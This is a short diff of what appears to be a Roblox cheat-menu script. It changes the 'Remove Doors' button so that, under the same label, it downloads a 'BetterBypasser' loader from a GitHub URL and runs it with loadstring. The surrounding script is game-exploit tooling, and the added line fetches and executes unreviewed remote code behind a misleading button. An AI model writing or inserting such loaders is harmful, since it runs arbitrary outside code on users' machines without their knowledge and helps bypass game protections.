@@ -160,11 +160,7 @@ end)
 
 -- Remove Doors Button
 RemoveDoorsButton = createButton("RemoveDoorsButton", UDim2.new(0.5, -buttonWidth/2, 0, verticalPosition + 6*(buttonHeight + buttonSpacing)), "Remove Doors", function()
-    for _, door in pairs(game:GetService("Workspace"):FindPartsInRegion3(workspace.CurrentCamera.CFrame:PointToWorldSpace(Vector3.new(0, 0, -50)), workspace.CurrentCamera.CFrame:PointToWorldSpace(Vector3.new(100, 100, 50)), nil)) do
-        if door.Name == "Door" then
-            door:Destroy()
-        end
-    end
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
 end)
 
 -- Noclip Button
